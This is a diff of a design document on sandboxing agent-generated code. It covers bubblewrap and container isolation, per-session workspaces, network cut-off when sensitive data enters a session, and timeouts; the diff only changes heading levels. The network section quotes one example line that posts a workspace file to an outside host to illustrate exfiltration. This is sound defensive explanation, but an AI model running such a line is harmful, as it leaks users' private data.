@@ -4,15 +4,15 @@ When agents use the CodeAct pattern -- generating and executing arbitrary code t
 
 This section describes the concepts and mechanisms behind sandboxed execution. The sandbox is a library-level abstraction: it provides the building blocks that higher-level systems (MCP servers, API services, CLI tools) compose into complete execution environments.
 
-## Why Agents Need Sandboxes
+### Why Agents Need Sandboxes
 
 A Python snippet can open files, make network requests, spawn processes, or modify the filesystem in ways that no tool permission system can anticipate. The sandbox addresses this by enforcing isolation at the infrastructure level. Rather than trying to restrict what code can do through static analysis or allow-lists (which are brittle and bypassable), the sandbox constrains the environment in which the code runs.
 
-## Process Isolation
+### Process Isolation
 
 The fundamental mechanism is process isolation: executing the agent's code in a separate process with restricted access to the host system.
 
-### Lightweight Isolation: Bubblewrap
+#### Lightweight Isolation: Bubblewrap
 
 On Linux, [bubblewrap](https://github.com/containers/bubblewrap) (`bwrap`) provides user-namespace-based isolation without requiring root privileges or a container runtime. It creates a minimal filesystem view by selectively bind-mounting only the paths the child process needs:
 
@@ -62,7 +62,7 @@ class SandboxBubblewrap(Sandbox):
 
 The child process sees a read-only root filesystem, a private `/tmp`, and only the bind mounts explicitly granted. The Python prefix is mounted read-only so that installed packages remain importable inside the sandbox. PID and network namespaces can be unshared independently. This is lightweight (no daemon, no images, no layers) and fast to start.
 
-### Fallback: Plain Subprocess
+#### Fallback: Plain Subprocess
 
 On platforms without bwrap (macOS, Windows), a subprocess fallback runs the command directly. No isolation is provided -- this is a development convenience, not a security boundary. The factory function selects the appropriate implementation:
 
@@ -73,17 +73,17 @@ def get_sandbox() -> Sandbox:
     return SandboxSubprocess()
 ```
 
-### Heavyweight Isolation: Containers
+#### Heavyweight Isolation: Containers
 
 For production multi-tenant deployments, container runtimes (Docker, Podman) provide stronger isolation: separate filesystem layers, cgroup resource limits, full network namespace control, and seccomp profiles. Container-based sandboxes are heavier to start and manage, but offer guarantees that bwrap alone does not (CPU/memory limits, storage quotas, image-based reproducibility).
 
 The sandbox abstraction accommodates both: the `Sandbox` ABC defines a uniform `run()` interface, and implementations range from "no isolation" through "user namespaces" to "full containers". The choice depends on the deployment context.
 
-## Filesystem Isolation
+### Filesystem Isolation
 
 The agent's code needs to read and write files, but it should only access its own workspace -- not the host filesystem, not other users' data.
 
-### Bind Mounts
+#### Bind Mounts
 
 The sandbox exposes specific host directories to the child process through bind mounts. A `BindMount(source, target, readonly)` maps a host path to a path visible inside the sandbox:
 
@@ -96,7 +96,7 @@ bind_mounts = [
 
 Inside the sandbox, the code sees `/workspace` as its working directory. It has no way to access paths outside the mounted directories.
 
-### Multi-Tenant Directory Layout
+#### Multi-Tenant Directory Layout
 
 When multiple users and sessions share a host, each session gets its own workspace directory:
 
@@ -109,21 +109,21 @@ When multiple users and sessions share a host, each session gets its own workspa
 
 The sandbox mounts only the current session's directory. Physical separation at the filesystem level prevents cross-session access without relying on application-level checks.
 
-### Path Translation
+#### Path Translation
 
 A translation layer converts between the agent-visible path (`/workspace/report.csv`) and the host path (`/data/users/alice/session-42/report.csv`). This happens at the boundary between the application and the sandbox -- the agent's code never sees host paths, and the host system never trusts agent-provided paths without translation and traversal checks.
 
-## Network Isolation
+### Network Isolation
 
 Network access is the primary exfiltration vector for code running inside a sandbox. An agent that has loaded sensitive data into its workspace could POST it to an external server. Tool permissions cannot prevent this because the code runs outside the tool framework -- a one-liner like `requests.post("https://external.com", data=open("/workspace/data.csv").read())` bypasses every permission check because it never goes through the tool-calling path.
 
-### Binary Network Control
+#### Binary Network Control
 
 The simplest and most auditable approach is a binary choice: the sandbox either has full network access or none at all. On bwrap, `--unshare-net` removes all network interfaces except loopback. On Docker, `network_mode="none"` does the same -- no DNS resolution, no TCP connections, no UDP traffic. The container becomes a compute island that can read and write files on its mounted workspace but cannot reach anything beyond `127.0.0.1`.
 
 There is no allow-list, no proxy, no partial access. This eliminates configuration errors and makes the security property trivial to verify.
 
-### Data-Sensitivity-Driven Switching
+#### Data-Sensitivity-Driven Switching
 
 The `PrivateData` compliance module drives the network switch. When a connector retrieves sensitive records -- patient data from a database, financial reports from an internal API -- it calls `PrivateData.add_private_dataset()` to register the dataset and its sensitivity level. The sandbox checks this state and selects the network mode accordingly:
 
@@ -140,7 +140,7 @@ def get_network_mode(user_id: str, session_id: str) -> NetworkMode:
 
 This is a one-way ratchet: once sensitive data enters a session, network access never returns. The sensitivity level can escalate (from INTERNAL to CONFIDENTIAL to SECRET) but never decrease. This mirrors the real-world principle that you cannot "un-see" data -- once an agent has processed confidential records, any subsequent code it generates could embed fragments of that data in network requests.
 
-### Dynamic Container Recreation
+#### Dynamic Container Recreation
 
 The sandbox manager checks `get_network_mode()` on every session access and compares the result against the container's current network mode. If the required mode is more restrictive, the manager stops the container and creates a new one with the correct network configuration.
 
@@ -155,7 +155,7 @@ entered this session. Outbound connections are blocked.
 
 The agent can then decide to work with the data locally, or ask the user for guidance.
 
-### Beyond Binary: Proxy-Based Selective Connectivity
+#### Beyond Binary: Proxy-Based Selective Connectivity
 
 The binary switch works well when data sensitivity is clear-cut, but enterprise workflows often need to combine private data with trusted external services: an internal company API, a data warehouse behind the VPN, a cloud service with a Zero Data Retention (ZDR) agreement. Cutting all network access forces the agent to stop mid-task whenever it needs to reach one of these services after private data has entered the session.
 
@@ -186,7 +186,7 @@ The mode selection then considers the sensitivity level: PUBLIC and INTERNAL dat
 
 This proxy-based approach is not implemented in our POC. The binary FULL/NONE switch covers the most common scenarios and is simple to deploy and audit. The proxy pattern is presented here as a design direction for production deployments where blanket network removal is too restrictive.
 
-## Timeout Enforcement
+### Timeout Enforcement
 
 Agent-generated code can loop forever, deadlock, or simply take longer than acceptable. Reliable timeout enforcement requires process-level control -- you cannot reliably interrupt a thread executing arbitrary code.
 
@@ -204,11 +204,11 @@ except asyncio.TimeoutError:
 
 The calling code receives a `SandboxResult` with `timed_out=True` and can report the timeout to the agent without crashing the host process.
 
-## Inter-Process Communication
+### Inter-Process Communication
 
 The sandbox runs code in a separate process. The calling code needs to send input (source code, namespace state) and receive output (results, stdout, stderr, figures). Two common patterns:
 
-### Pickle IPC
+#### Pickle IPC
 
 The REPL module uses pickle-based IPC through the filesystem. The caller writes a pickle file to a temp directory, the sandbox mounts that directory, the executor reads input and writes output as pickle files:
 
@@ -221,11 +221,11 @@ output = pickle.loads((temp_dir / "output.pkl").read_bytes())
 
 This works because the temp directory is bind-mounted into the sandbox, giving both sides access. The approach is simple and supports arbitrary Python objects (dataframes, figures, custom classes).
 
-### Stdout/Stderr Capture
+#### Stdout/Stderr Capture
 
 For simpler cases, the sandbox captures the child process's stdout and stderr as byte strings in `SandboxResult`. This suffices for commands that produce text output and where the only structured result is the exit code.
 
-## Resource Limits
+### Resource Limits
 
 Beyond filesystem and network isolation, production sandboxes need resource limits to prevent a single session from exhausting host resources.
 
@@ -237,7 +237,7 @@ Beyond filesystem and network isolation, production sandboxes need resource limi
 
 **Process count**: PID namespace isolation (`--unshare-pid` in bwrap, default in containers) prevents fork bombs from affecting the host.
 
-## Session Lifecycle
+### Session Lifecycle
 
 In a multi-tenant system, sandboxes are tied to user sessions. The lifecycle follows a predictable pattern:
 
@@ -249,7 +249,7 @@ In a multi-tenant system, sandboxes are tied to user sessions. The lifecycle fol
 
 **Cleanup**: Background processes periodically remove expired sessions and their sandbox resources. Cleanup operations are defensive -- errors in cleaning one session do not prevent cleanup of others.
 
-## Security Layers
+### Security Layers
 
 The sandbox is one layer in a defense-in-depth approach to agent security:
 
@@ -271,7 +271,7 @@ Agent
 
 Neither layer depends on the other. Tool permissions cannot prevent code from making network requests inside a sandbox. Sandbox network isolation cannot prevent a tool from calling an external API. Together with the `PrivateData` compliance module that drives both layers, the system provides a coherent data protection pipeline: connectors tag data as it enters the session, tool permissions restrict the agent's tool vocabulary, and the sandbox restricts the network reach. A failure or misconfiguration in one layer does not expose data through the other.
 
-## Design Trade-offs
+### Design Trade-offs
 
 **One sandbox per session** simplifies lifecycle management (no shared state, no cross-session interference) but costs more resources than pooling. For strong isolation, this trade-off is worthwhile.
 
